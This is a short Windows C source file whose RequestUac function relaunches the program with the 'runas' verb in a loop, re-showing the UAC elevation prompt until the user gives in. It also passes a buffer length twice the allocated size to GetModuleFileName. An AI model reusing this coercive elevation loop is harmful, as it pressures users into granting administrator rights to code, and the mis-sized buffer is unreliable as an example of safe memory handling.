#include "Vfs.h"
#include "UAC.h"

VOID RequestUac(VOID)
{
	PWCHAR pModulePathW;
	SHELLEXECUTEINFOW ExecInfoW = {0};

	if (pModulePathW = (PWCHAR)AllocateMemory(PAGE_SIZE))
	{
		if (GetModuleFileName(NULL,pModulePathW,0x1000))
		{
			CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);

			ExecInfoW.cbSize = sizeof(SHELLEXECUTEINFO);
			ExecInfoW.lpVerb = RUNAS;
			ExecInfoW.lpFile = pModulePathW;

			while(!ShellExecuteEx(&ExecInfoW));
		}
		FreeMemory(pModulePathW);
	}
}